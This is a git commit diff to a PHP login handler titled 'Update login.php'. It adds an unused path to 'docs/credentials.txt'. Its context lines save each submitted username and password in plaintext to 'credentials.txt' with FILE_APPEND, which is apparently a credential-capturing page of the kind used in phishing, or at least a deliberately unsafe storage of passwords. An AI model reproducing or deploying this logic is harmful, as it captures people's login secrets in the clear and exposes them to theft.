2d13757809d4597a50354989437cf2d66d7da56e
BitingTodal <131238555+BitingTodal@users.noreply.github.com>
2025-01-10 00:15:56 +0100

    Update login.php

--- login.php
+++ login.php
@@ -3,6 +3,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
+    $file = 'docs/credentials.txt';
+
     // Save the credentials to a file or database
     file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
 
